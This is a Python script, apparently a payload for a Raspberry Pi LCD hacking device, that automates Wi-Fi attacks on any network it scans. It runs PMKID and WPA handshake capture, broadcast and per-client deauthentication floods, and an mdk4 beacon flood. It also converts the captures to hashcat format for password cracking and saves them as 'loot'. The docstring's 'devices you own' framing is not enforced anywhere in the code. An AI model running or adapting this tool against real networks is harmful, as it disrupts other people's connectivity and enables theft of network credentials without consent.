#!/usr/bin/env python3
"""
KTOx payload – WiFi Lab Orchestrator
=======================================
A single, powerful Wi‑Fi lab tool for your KTOx LCD that orchestrates:
- PMKID capture (hcxdumptool)
- WPA handshake capture (airodump-ng + optional deauth via aireplay-ng)
- Targeted deauth (adaptive intervals)
- Beacon smoke/impersonation (target ESSID beacon flood)

Designed to test devices you own (e.g., your broken laptop). It uses a clean
GUI-only flow, honors KTOx conventions, and cleans up reliably.

Requirements
- Root
- Tools: hcxdumptool, airodump-ng, aireplay-ng (aircrack-ng suite), iw
- Injection-capable adapter recommended
"""
import os
import sys
import time
import json
import signal
import subprocess
import threading
import shutil
import tempfile

# KTOx pathing
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
# payloads/ dir (for monitor_mode_helper), then KTOx root (for LCD drivers)
_PAYLOADS_DIR = os.path.abspath(os.path.join(BASE_DIR, '..'))
if _PAYLOADS_DIR not in sys.path:
    sys.path.insert(0, _PAYLOADS_DIR)
if os.path.isdir('/root/KTOx') and '/root/KTOx' not in sys.path:
    sys.path.insert(0, '/root/KTOx')

# Hardware/UI (strict order)
try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
except Exception as e:
    print(f"[ERROR] LCD/GPIO deps missing: {e}", file=sys.stderr)
    sys.exit(1)

def get_available_interfaces():
    """Return list of wireless interface names via iw."""
    try:
        import re as _re
        out = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5).stdout
        return _re.findall(r'Interface\s+(\S+)', out)
    except Exception:
        return []

# WiFi integration — load canonical helper by direct file path to avoid
# sys.path / namespace-package ambiguity when payloads/ is on sys.path.
monitor_mode_helper = None
try:
    import importlib.util as _ilu
    _mmh_candidates = [
        '/root/KTOx/wifi/monitor_mode_helper.py',
        os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                     'wifi', 'monitor_mode_helper.py'),
    ]
    for _mmh_path in _mmh_candidates:
        if os.path.isfile(_mmh_path):
            _spec = _ilu.spec_from_file_location('_wifi_mmh', _mmh_path)
            monitor_mode_helper = _ilu.module_from_spec(_spec)
            _spec.loader.exec_module(monitor_mode_helper)
            break
    WIFI_OK = monitor_mode_helper is not None
except Exception:
    WIFI_OK = False

WIDTH, HEIGHT = 128, 128

# PINS from gui_conf.json
PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}

def _find_gui_conf():
    cands = [
        os.path.join(os.getcwd(), 'gui_conf.json'),
        os.path.join('/root/KTOx', 'gui_conf.json'),
        os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'KTOx', 'gui_conf.json'),
    ]
    for sp in list(sys.path):
        try:
            if sp and os.path.basename(sp) == 'KTOx':
                cands.append(os.path.join(sp, 'gui_conf.json'))
        except Exception:
            pass
    for p in cands:
        if os.path.exists(p): return p
    return None

try:
    cfg = _find_gui_conf()
    if cfg:
        with open(cfg,'r') as f: data = json.load(f)
        mp = data.get('PINS', {})
        PINS = {
            "UP": mp.get("KEY_UP_PIN", PINS["UP"]),
            "DOWN": mp.get("KEY_DOWN_PIN", PINS["DOWN"]),
            "LEFT": mp.get("KEY_LEFT_PIN", PINS["LEFT"]),
            "RIGHT": mp.get("KEY_RIGHT_PIN", PINS["RIGHT"]),
            "OK": mp.get("KEY_PRESS_PIN", PINS["OK"]),
            "KEY1": mp.get("KEY1_PIN", PINS["KEY1"]),
            "KEY2": mp.get("KEY2_PIN", PINS["KEY2"]),
            "KEY3": mp.get("KEY3_PIN", PINS["KEY3"]),
        }
except Exception:
    pass

GPIO.setmode(GPIO.BCM)
for p in PINS.values():
    GPIO.setup(p, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD(); LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
IMG = Image.new("RGB", (WIDTH, HEIGHT), "black")
DRAW = ImageDraw.Draw(IMG)
try:
    FONT_TITLE = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf', 12)
except Exception:
    FONT_TITLE = ImageFont.load_default()
FONT = ImageFont.load_default()

RUN = True

# Config/state
CFG = {
    "aggressive_kill": True,
    "channel": None,
    "deauth_burst": 15,
    "deauth_interval": 0.5,  # seconds between bursts in adaptive mode
    "auto_pmkid_secs": 25,
    "auto_handshake_secs": 35,
}

WIFI_IFACE = None
MON_IFACE = None
TARGET = {"bssid": None, "essid": None}
TARGET_STA = None

# Loot dir (prefer installed KTOx)
KTOX_ROOT = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(BASE_DIR, '..', '..'))
LOOT_DIR = os.path.join(KTOX_ROOT, 'loot', 'WiFi_Lab')
os.makedirs(LOOT_DIR, exist_ok=True)

# -------------- UI helpers --------------

def draw_top(lines):
    IMG.paste((0,0,0), [0,0,WIDTH,HEIGHT])
    y = 3
    for s in lines:
        DRAW.text((4,y), s, font=FONT_TITLE, fill='#00FF00')
        y += 14

def draw_footer(s):
    DRAW.text((4, 112), s, font=FONT, fill='#AAAAAA')
    LCD.LCD_ShowImage(IMG, 0, 0)

def msg(lines, footer=None):
    draw_top(lines)
    if footer:
        draw_footer(footer)
    else:
        LCD.LCD_ShowImage(IMG, 0, 0)

# -------------- Aggressive Kill --------------

def aggressive_kill_setup(iface):
    try:
        subprocess.run(["systemctl","stop","avahi-daemon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["systemctl","stop","NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["systemctl","stop","wpa_supplicant"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["pkill","-9","dhclient"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["pkill","-9","wpa_supplicant"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["rfkill","unblock","all"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iw","dev", iface, "set", "power_save","off"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def aggressive_kill_restore():
    try:
        subprocess.run(["systemctl","start","NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["systemctl","start","wpa_supplicant"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["systemctl","start","avahi-daemon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

# -------------- Discovery --------------

def iw_scan_ap_list(base_iface, timeout=6):
    # Scan using iw (managed iface); return list of (bssid, essid, channel)
    try:
        proc = subprocess.run(["iw","dev", base_iface, "scan"], capture_output=True, text=True, timeout=timeout)
        if proc.returncode != 0:
            return []
        lines = proc.stdout.splitlines()
        aps = []
        bssid=essid=None; ch=None
        for raw in lines:
            s = raw.strip()
            if s.startswith("BSS "):
                if bssid:
                    aps.append((bssid, essid or 'Hidden', ch))
                parts = s.split(); bssid = parts[1] if len(parts) > 1 else None
                essid=None; ch=None
            elif s.startswith("SSID:"):
                essid = s.split(":",1)[1].strip()
            elif s.startswith("primary channel:"):
                try: ch = int(s.split(":",1)[1].strip())
                except: ch=None
        if bssid:
            aps.append((bssid, essid or 'Hidden', ch))
        # Dedup by bssid (first occurrence wins)
        seen=set(); uniq=[]
        for b,e,c in aps:
            if not b or b in seen: continue
            seen.add(b); uniq.append((b,e,c))
        return uniq
    except Exception:
        return []

# -------------- Attacks --------------

def convert_to_22000(in_path, out_path):
    if shutil.which("hcxpcapngtool") is None:
        return False
    try:
        subprocess.run(["hcxpcapngtool", "-o", out_path, in_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
        return os.path.exists(out_path) and os.path.getsize(out_path) > 0
    except Exception:
        return False

def parse_clients_from_airodump_csv(csv_path, target_bssid):
    clients = []
    try:
        with open(csv_path, 'r', encoding='utf-8', errors='ignore') as f:
            data = f.read().splitlines()
        # Find station section (after a blank line following AP headers)
        station_section = False
        for line in data:
            if not line.strip():
                # next lines may start stations section
                if station_section is False:
                    station_section = None
                continue
            if station_section is None and line.startswith("Station MAC"):
                station_section = True
                continue
            if station_section:
                parts = [p.strip() for p in line.split(',')]
                if len(parts) >= 7:
                    sta_mac = parts[0]
                    bssid = parts[5]
                    if bssid.lower() == (target_bssid or '').lower() and sta_mac not in clients:
                        clients.append(sta_mac)
        return clients
    except Exception:
        return []


def select_client_with_airodump(mon_iface, bssid, channel, scan_secs=8):
    # Run airodump to discover clients associated with target BSSID
    msg(["Discovering clients", (bssid or '')[-8:]], "KEY1/LEFT=Stop")
    prefix = tempfile.mktemp(prefix="rj_clients_")
    cmd = ["airodump-ng", "--bssid", bssid, "--output-format", "csv", "-w", prefix]
    if channel: cmd += ["-c", str(channel)]
    cmd += [mon_iface]
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
    start = time.time(); last=0; db=0.25
    try:
        while time.time() - start < scan_secs:
            now = time.time()
            if (GPIO.input(PINS["KEY1"])==0 or GPIO.input(PINS["LEFT"])==0) and (now-last>db):
                last = now
                break
            time.sleep(0.2)
    finally:
        try: os.killpg(proc.pid, signal.SIGINT)
        except Exception: pass
    csv_path = f"{prefix}-01.csv"
    clients = parse_clients_from_airodump_csv(csv_path, bssid)
    # Simple selector UI
    if not clients:
        return None
    sel=0; last=0
    while True:
        now=time.time()
        msg(["Pick Client", clients[sel], (bssid or '')[-8:]], "UP/DN sel OK pick LEFT back")
        if GPIO.input(PINS['UP'])==0 and now-last>db: last=now; sel=(sel-1)%len(clients)
        elif GPIO.input(PINS['DOWN'])==0 and now-last>db: last=now; sel=(sel+1)%len(clients)
        elif GPIO.input(PINS['OK'])==0 and now-last>db: return clients[sel]
        elif GPIO.input(PINS['LEFT'])==0 and now-last>db: return None
        time.sleep(0.05)


def run_targeted_deauth_client(mon_iface, base_iface, bssid, essid, client_mac, channel):
    if shutil.which("aireplay-ng") is None:
        msg(["aireplay-ng", "not installed"], "Any key..."); time.sleep(3); return
    msg(["Deauth (client)", (client_mac or '')[-8:]], "KEY1/LEFT=Stop")
    if CFG.get("aggressive_kill", True): aggressive_kill_setup(base_iface)
    try:
        set_channel(mon_iface, channel)
        cmd = ["aireplay-ng", "-0", str(CFG.get("deauth_burst", 15)), "-a", bssid, "-c", client_mac, mon_iface]
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
        last=0; db=0.25
        while True:
            now=time.time()
            if (GPIO.input(PINS["KEY1"])==0 or GPIO.input(PINS["LEFT"])==0) and (now-last>db):
                last=now
                try: os.killpg(proc.pid, signal.SIGINT)
                except Exception: pass
                break
            if proc.poll() is not None: break
            time.sleep(0.1)
    finally:
        if CFG.get("aggressive_kill", True): aggressive_kill_restore()
    msg(["Client deauth done"], "Press any key...")

def run_pmkid_capture(mon_iface, base_iface, bssid, essid, channel):
    msg(["PMKID capture", (essid or bssid)[-16:]], "KEY1/LEFT=Stop")
    out = os.path.join(LOOT_DIR, f"pmkid_{time.strftime('%Y%m%d_%H%M%S')}.pcapng")
    cmd = ["hcxdumptool", "-i", mon_iface, "-o", out, "--enable_status=1"]
    if channel: cmd += ["-c", str(channel)]
    if CFG.get("aggressive_kill", True): aggressive_kill_setup(base_iface)
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, preexec_fn=os.setsid)
        last=0; db=0.25
        while True:
            if proc.poll() is not None: break
            # Stop
            now=time.time()
            if (GPIO.input(PINS["KEY1"])==0 or GPIO.input(PINS["LEFT"])==0) and (now-last>db):
                last=now
                try:
                    os.killpg(proc.pid, signal.SIGINT)
                    time.sleep(0.5)
                    if proc.poll() is None: os.killpg(proc.pid, signal.SIGTERM)
                except Exception: pass
                break
            time.sleep(0.1)
    finally:
        if CFG.get("aggressive_kill", True): aggressive_kill_restore()
    # Summarize
    if os.path.exists(out) and os.path.getsize(out) > 24:
        msg(["PMKID Captured", os.path.basename(out)], "Press any key...")
    else:
        msg(["No PMKID captured"], "Press any key...")


def run_handshake_capture(mon_iface, base_iface, bssid, essid, channel, deauth=True):
    if shutil.which("airodump-ng") is None:
        msg(["airodump-ng", "not installed"], "Any key..."); time.sleep(3); return
    msg(["Handshake capture", (essid or bssid)[-16:]], "KEY1/LEFT=Stop")
    ts = time.strftime('%Y%m%d_%H%M%S')
    cap_prefix = os.path.join(LOOT_DIR, f"hs_{ts}")
    # airodump-ng focused on target
    dump_cmd = ["airodump-ng", "-w", cap_prefix]
    if channel: dump_cmd += ["-c", str(channel)]
    if bssid: dump_cmd += ["--bssid", bssid]
    dump_cmd += [mon_iface]
    if CFG.get("aggressive_kill", True): aggressive_kill_setup(base_iface)
    try:
        dump = subprocess.Popen(dump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
        deauth_proc = None
        if deauth:
            try:
                deauth_cmd = ["aireplay-ng", "-0", "3", "-a", bssid, mon_iface]
                deauth_proc = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
            except Exception:
                pass
        last=0; db=0.25
        while True:
            now=time.time()
            if (GPIO.input(PINS["KEY1"])==0 or GPIO.input(PINS["LEFT"])==0) and (now-last>db):
                last=now
                try:
                    os.killpg(dump.pid, signal.SIGINT)
                    if deauth_proc: os.killpg(deauth_proc.pid, signal.SIGINT)
                except Exception: pass
                break
            time.sleep(0.25)
    finally:
        if CFG.get("aggressive_kill", True): aggressive_kill_restore()
    # Evaluate
    cap_file = f"{cap_prefix}-01.cap"
    hs22000 = f"{cap_prefix}-01.22000"
    have_22000 = convert_to_22000(cap_file, hs22000)
    if have_22000:
        msg(["Handshake Captured", os.path.basename(hs22000)], "Press any key...")
    elif os.path.exists(cap_file) and os.path.getsize(cap_file) > 256:
        msg(["Handshake Captured", os.path.basename(cap_file)], "Press any key...")
    else:
        msg(["No handshake captured"], "Press any key...")


def set_channel(iface, channel):
    try:
        if channel:
            subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass


def run_targeted_deauth(mon_iface, base_iface, bssid, essid, channel):
    if shutil.which("aireplay-ng") is None:
        msg(["aireplay-ng", "not installed"], "Any key..."); time.sleep(3); return
    msg(["Deauth (broadcast)", (essid or bssid)[-16:]], "KEY1/LEFT=Stop")
    if CFG.get("aggressive_kill", True): aggressive_kill_setup(base_iface)
    try:
        set_channel(mon_iface, channel)
        cmd = ["aireplay-ng", "-0", str(CFG.get("deauth_burst", 15)), "-a", bssid, mon_iface]
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
        last=0; db=0.25
        while True:
            now=time.time()
            if (GPIO.input(PINS["KEY1"])==0 or GPIO.input(PINS["LEFT"])==0) and (now-last>db):
                last=now
                try: os.killpg(proc.pid, signal.SIGINT)
                except Exception: pass
                break
            if proc.poll() is not None: break
            time.sleep(0.1)
    finally:
        if CFG.get("aggressive_kill", True): aggressive_kill_restore()
    msg(["Deauth complete"], "Press any key...")


def run_beacon_flood_mdk4(mon_iface, base_iface, essid, channel):
    if shutil.which("mdk4") is None:
        msg(["mdk4 not installed"], "Install mdk4"); return
    msg(["Beacon Flood", (essid or '')[:16]], "KEY1/LEFT=Stop")
    if CFG.get("aggressive_kill", True): aggressive_kill_setup(base_iface)
    try:
        args = ["mdk4", mon_iface, "b"]
        if essid: args += ["-s", essid]
        if channel: args += ["-c", str(channel)]
        proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
        last=0; db=0.25
        while True:
            now=time.time()
            if (GPIO.input(PINS["KEY1"])==0 or GPIO.input(PINS["LEFT"])==0) and (now-last>db):
                last=now
                try: os.killpg(proc.pid, signal.SIGINT)
                except Exception: pass
                break
            if proc.poll() is not None: break
            time.sleep(0.1)
    finally:
        if CFG.get("aggressive_kill", True): aggressive_kill_restore()
    msg(["Beacon flood stop"], "Press any key...")


def run_auto_attack(mon_iface, base_iface, bssid, essid, channel):
    # Step 1: PMKID attempt
    msg(["Auto: PMKID", (essid or bssid or '')[-16:]], "KEY1/LEFT=Stop")
    ts = time.strftime('%Y%m%d_%H%M%S')
    pmkid_pcapng = os.path.join(LOOT_DIR, f"auto_{ts}.pcapng")
    if CFG.get("aggressive_kill", True): aggressive_kill_setup(base_iface)
    try:
        set_channel(mon_iface, channel)
        proc = subprocess.Popen(["hcxdumptool", "-i", mon_iface, "-o", pmkid_pcapng, "--enable_status=1"] ,
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
        start = time.time(); last=0; db=0.25
        while time.time() - start < CFG.get('auto_pmkid_secs', 25):
            now=time.time()
            if (GPIO.input(PINS['KEY1'])==0 or GPIO.input(PINS['LEFT'])==0) and now-last>db:
                last=now
                break
            time.sleep(0.2)
    finally:
        try: os.killpg(proc.pid, signal.SIGINT)
        except Exception: pass
        if CFG.get("aggressive_kill", True): aggressive_kill_restore()
    pmkid_22000 = os.path.join(LOOT_DIR, f"auto_{ts}.22000")
    if convert_to_22000(pmkid_pcapng, pmkid_22000):
        msg(["PMKID Captured", os.path.basename(pmkid_22000)], "Press any key...")
        return

    # Step 2: Handshake attempt with deauth
    msg(["Auto: Handshake", (essid or bssid or '')[-16:]], "KEY1/LEFT=Stop")
    cap_prefix = os.path.join(LOOT_DIR, f"auto_hs_{ts}")
    if CFG.get("aggressive_kill", True): aggressive_kill_setup(base_iface)
    try:
        dump_cmd = ["airodump-ng", "-w", cap_prefix]
        if channel: dump_cmd += ["-c", str(channel)]
        if bssid: dump_cmd += ["--bssid", bssid]
        dump_cmd += [mon_iface]
        dump = subprocess.Popen(dump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
        # Repeated deauth bursts
        start = time.time(); last=0; db=0.25
        while time.time() - start < CFG.get('auto_handshake_secs', 35):
            now=time.time()
            if (GPIO.input(PINS['KEY1'])==0 or GPIO.input(PINS['LEFT'])==0) and now-last>db:
                last=now
                break
            try:
                subprocess.run(["aireplay-ng", "-0", "3", "-a", bssid, mon_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=6)
            except Exception:
                pass
            time.sleep(max(0.2, CFG.get('deauth_interval', 0.5)))
    finally:
        try: os.killpg(dump.pid, signal.SIGINT)
        except Exception: pass
        if CFG.get("aggressive_kill", True): aggressive_kill_restore()
    cap_file = f"{cap_prefix}-01.cap"
    hs22000 = f"{cap_prefix}-01.22000"
    if convert_to_22000(cap_file, hs22000):
        msg(["Handshake Captured", os.path.basename(hs22000)], "Press any key...")
    elif os.path.exists(cap_file) and os.path.getsize(cap_file) > 256:
        msg(["Handshake Captured", os.path.basename(cap_file)], "Press any key...")
    else:
        msg(["No capture (auto)"], "Press any key...")


def show_pmf_rsn_analysis(base_iface, bssid):
    info = analyze_pmf_rsn(base_iface, bssid)
    msg([
        "PMF/RSN",
        f"PMF: {info.get('pmf','?')}",
        f"AKM: {', '.join(info.get('akm', [])[:2])}",
    ], "Press any key...")


def analyze_pmf_rsn(base_iface, bssid):
    out = {"pmf": "unknown", "akm": []}
    try:
        proc = subprocess.run(["iw", "dev", base_iface, "scan"], capture_output=True, text=True, timeout=8)
        if proc.returncode != 0:
            return out
        lines = proc.stdout.splitlines()
        in_bss = False; in_rsn = False
        for raw in lines:
            s = raw.strip()
            if s.startswith("BSS "):
                in_bss = bssid and (bssid.lower() in s.lower())
                in_rsn = False
                continue
            if not in_bss:
                continue
            if s.startswith("RSN:"):
                in_rsn = True
                continue
            if in_rsn and s == "":
                in_rsn = False
            if in_rsn:
                if "PMF" in s or "MFP" in s or "Mgmt frame protection" in s:
                    low = s.lower()
                    if "required" in low:
                        out['pmf'] = 'required'
                    elif "capable" in low or "optional" in low:
                        out['pmf'] = 'optional'
                    else:
                        out['pmf'] = 'not set'
                if "Authentication suites:" in s:
                    suites = s.split(':',1)[1].strip()
                    out['akm'] = [p.strip() for p in suites.split()]
        return out
    except Exception:
        return out

# -------------- Main --------------
def cleanup(*_):
    global RUN
    RUN = False

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

if __name__ == '__main__':
    try:
        if os.geteuid() != 0:
            msg(["Root required"], "Run as sudo"); time.sleep(3); sys.exit(1)
        if not WIFI_OK:
            msg(["WiFi integration missing"], None); time.sleep(3); sys.exit(1)

        # Prerequisite tool check
        missing = [t for t in ("hcxdumptool", "hcxpcapngtool", "airodump-ng", "aireplay-ng")
                   if shutil.which(t) is None]
        if missing:
            msg(["Missing tools:", ", ".join(missing[:2]),
                 ", ".join(missing[2:]) if len(missing) > 2 else ""], "Any key to continue")
            last_any = time.time()
            while time.time() - last_any < 5:
                if any(GPIO.input(p) == 0 for p in PINS.values()):
                    break
                time.sleep(0.05)

        # Interface selection (managed iface)
        ifaces = [i for i in get_available_interfaces() if i.startswith('wlan')]
        if 'wlan1' in ifaces:
            ifaces.remove('wlan1'); ifaces.insert(0,'wlan1')
        if not ifaces:
            msg(["No WiFi iface"], None); time.sleep(3); sys.exit(1)
        sel=0; last=0; db=0.25
        while RUN:
            msg(["Select Interface", ifaces[sel]],["OK=Confirm LEFT=Exit"])
            now=time.time()
            if GPIO.input(PINS['UP'])==0 and now-last>db: last=now; sel=(sel-1)%len(ifaces)
            elif GPIO.input(PINS['DOWN'])==0 and now-last>db: last=now; sel=(sel+1)%len(ifaces)
            elif GPIO.input(PINS['OK'])==0 and now-last>db: last=now; WIFI_IFACE=ifaces[sel]; break
            elif GPIO.input(PINS['LEFT'])==0 and now-last>db: sys.exit(0)
            time.sleep(0.05)

        # AP selection via iw scan (stay managed)
        msg(["Scanning APs..."], None)
        aps = iw_scan_ap_list(WIFI_IFACE, timeout=8)
        if not aps:
            msg(["No APs found"], None); time.sleep(3); sys.exit(1)
        sel=0; last=0
        while RUN:
            b,e,c = aps[sel]
            msg(["Pick Target", f"{e[:16]}", f"ch:{c or '?'} {b[-8:]}"],["UP/DN sel OK pick LEFT back"])
            now=time.time()
            if GPIO.input(PINS['UP'])==0 and now-last>db: last=now; sel=(sel-1)%len(aps)
            elif GPIO.input(PINS['DOWN'])==0 and now-last>db: last=now; sel=(sel+1)%len(aps)
            elif GPIO.input(PINS['OK'])==0 and now-last>db:
                TARGET['bssid']=aps[sel][0]; TARGET['essid']=aps[sel][1]; CFG['channel']=aps[sel][2]; break
            elif GPIO.input(PINS['LEFT'])==0 and now-last>db: sys.exit(0)
            time.sleep(0.05)

        # Monitor mode before attacks
        msg([f"Monitor on {WIFI_IFACE}"], None)
        MON_IFACE = monitor_mode_helper.activate_monitor_mode(WIFI_IFACE)
        if not MON_IFACE:
            msg(["Monitor failed"], None); time.sleep(3); sys.exit(1)
        time.sleep(0.5)

        # Attack menu
        has_mdk4 = shutil.which("mdk4") is not None
        attacks = [
            "Auto Attack Suite",
            "PMKID Capture",
            "Handshake Capture",
            "Deauth (broadcast)",
            "Deauth (client)",
            f"Beacon Flood ({'mdk4' if has_mdk4 else 'missing'})",
            "Analyze PMF/RSN",
            "Aggressive Kill: ON",
        ]
        sel=0; last=0
        def refresh_menu():
            attacks[-1] = f"Aggressive Kill: {'ON' if CFG.get('aggressive_kill',True) else 'OFF'}"
            attacks[5] = f"Beacon Flood ({'mdk4' if shutil.which('mdk4') else 'missing'})"
        refresh_menu()
        while RUN:
            refresh_menu()
            title_line = (TARGET['essid'] or TARGET['bssid'] or '')[:16]
            msg(["WiFi Lab", title_line, attacks[sel]],["UP/DN sel OK run LEFT exit"])
            now=time.time()
            if GPIO.input(PINS['UP'])==0 and now-last>db: last=now; sel=(sel-1)%len(attacks)
            elif GPIO.input(PINS['DOWN'])==0 and now-last>db: last=now; sel=(sel+1)%len(attacks)
            elif GPIO.input(PINS['OK'])==0 and now-last>db:
                last=now
                if sel==0:
                    run_auto_attack(MON_IFACE, WIFI_IFACE, TARGET['bssid'], TARGET['essid'], CFG.get('channel'))
                elif sel==1:
                    run_pmkid_capture(MON_IFACE, WIFI_IFACE, TARGET['bssid'], TARGET['essid'], CFG.get('channel'))
                elif sel==2:
                    run_handshake_capture(MON_IFACE, WIFI_IFACE, TARGET['bssid'], TARGET['essid'], CFG.get('channel'), deauth=True)
                elif sel==3:
                    run_targeted_deauth(MON_IFACE, WIFI_IFACE, TARGET['bssid'], TARGET['essid'], CFG.get('channel'))
                elif sel==4:
                    # client deauth flow
                    client = select_client_with_airodump(MON_IFACE, TARGET['bssid'], CFG.get('channel'))
                    if client:
                        run_targeted_deauth_client(MON_IFACE, WIFI_IFACE, TARGET['bssid'], TARGET['essid'], client, CFG.get('channel'))
                    else:
                        msg(["No clients found"], "Press any key...")
                elif sel==5:
                    run_beacon_flood_mdk4(MON_IFACE, WIFI_IFACE, TARGET['essid'] or TARGET['bssid'], CFG.get('channel'))
                elif sel==6:
                    show_pmf_rsn_analysis(WIFI_IFACE, TARGET['bssid'])
                else:
                    CFG['aggressive_kill'] = not CFG.get('aggressive_kill', True)
                time.sleep(0.2)
            elif GPIO.input(PINS['LEFT'])==0 and now-last>db:
                break
            time.sleep(0.05)

    except SystemExit:
        pass
    except Exception as e:
        try:
            with open('/tmp/wifi_lab_orchestrator_error.log','w') as f:
                import traceback
                f.write(f"FATAL: {e}\n"); traceback.print_exc(file=f)
        except Exception:
            pass
    finally:
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        try:
            if MON_IFACE:
                monitor_mode_helper.deactivate_monitor_mode(MON_IFACE)
        except Exception:
            pass
        try:
            GPIO.cleanup()
        except Exception:
            pass
